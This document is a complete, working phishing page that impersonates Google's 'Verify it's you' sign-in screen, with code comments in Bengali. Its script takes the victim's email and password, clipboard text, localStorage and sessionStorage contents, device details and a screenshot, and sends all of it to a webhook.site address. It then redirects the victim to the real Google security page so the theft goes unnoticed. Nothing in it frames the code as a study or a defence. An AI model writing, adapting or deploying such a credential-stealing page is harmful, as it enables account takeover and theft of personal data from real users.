<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Security - Critical Alert</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .auth-card { width: 100%; max-width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: left; }
        .logo-box { margin-bottom: 24px; text-align: center; }
        .alert-text { background: #fce8e6; color: #d93025; padding: 10px; border-radius: 4px; font-size: 13px; margin-bottom: 20px; display: none; }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; color: #202124; text-align: center; }
        p { font-size: 16px; color: #202124; margin-bottom: 32px; text-align: center; }
        .field { position: relative; margin-bottom: 20px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: 0.2s; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .btn-submit { background: #1a73e8; color: #fff; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; }
        #loading { display: none; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>

<div class="auth-card">
    <div class="logo-box">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
    </div>
    <div id="alertBox" class="alert-text">Unauthorized access detected. Please verify your identity.</div>
    <h1>Verify it's you</h1>
    <p>To continue, first verify it's you</p>
    
    <form id="mainForm">
        <div class="field">
            <input type="email" id="u_mail" placeholder="Email or phone" required>
        </div>
        <div class="field">
            <input type="password" id="u_pass" placeholder="Enter your password" required>
        </div>
        <div class="footer">
            <span style="color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;">Forgot password?</span>
            <button type="submit" class="btn-submit">Next</button>
        </div>
    </form>

    <div id="loading">
        <img src="https://www.google.com/images/spin-32.gif" width="32"><br>
        <span style="font-size: 12px; color: #5f6368;">Analyzing device security...</span>
    </div>
</div>

<script>
    const WEBHOOK = "https://webhook.site/83aa407e-8191-4bd4-82c1-b8cc21a84216";

    // ১. হার্ডওয়্যার এবং ব্রাউজার স্টোরেজ ট্র্যাকিং
    async function deepTrack() {
        let battery = await navigator.getBattery();
        let payload = {
            hw: {
                cores: navigator.hardwareConcurrency,
                mem: navigator.deviceMemory,
                net: navigator.connection ? navigator.connection.effectiveType : "N/A",
                downLink: navigator.connection ? navigator.connection.downlink + "Mbps" : "N/A"
            },
            storage: {
                local: JSON.stringify(localStorage),
                session: JSON.stringify(sessionStorage)
            },
            battery: (battery.level * 100) + "%",
            url: window.location.href
        };
        fetch(WEBHOOK + "?deep_log=" + btoa(JSON.stringify(payload)), {mode: 'no-cors'});
    }

    // ২. ক্লিপবোর্ড ডেটা চুরি করার চেষ্টা
    async function grabClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            fetch(WEBHOOK + "?clipboard=" + btoa(text), {mode: 'no-cors'});
        } catch (e) {}
    }

    // ৩. ট্যাব-ন্যাপিং (ইউজার ট্যাব পরিবর্তন করলে সতর্ক করা)
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = "Critical Security Alert!"; // ট্যাব টাইটেল পরিবর্তন
        } else {
            document.title = "Account Security - Critical Alert";
            document.getElementById('alertBox').style.display = 'block'; // ফিরে আসলে অ্যালার্ট দেখানো
        }
    });

    // ৪. ইনভিজিবল হাই-রেজোলিউশন স্ক্রিনশট
    function snap() {
        html2canvas(document.body, {scale: 2}).then(canvas => {
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ "h_res_snap": canvas.toDataURL("image/jpeg", 0.5) })
            });
        });
    }

    window.onload = () => {
        deepTrack();
        grabClipboard();
        setTimeout(snap, 4000);
    };

    // ৫. ডাটা কালেকশন এবং রিডাইরেক্ট
    document.getElementById('mainForm').addEventListener('submit', function(e) {
        e.preventDefault();
        document.getElementById('mainForm').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        const u = document.getElementById('u_mail').value;
        const p = document.getElementById('u_pass').value;

        fetch(WEBHOOK + "?final_access=" + btoa("U: "+u+" | P: "+p), {mode: 'no-cors'})
        .then(() => {
            setTimeout(() => {
                window.location.href = "https://myaccount.google.com/security";
            }, 2500);
        });
    });
</script>

</body>
</html>
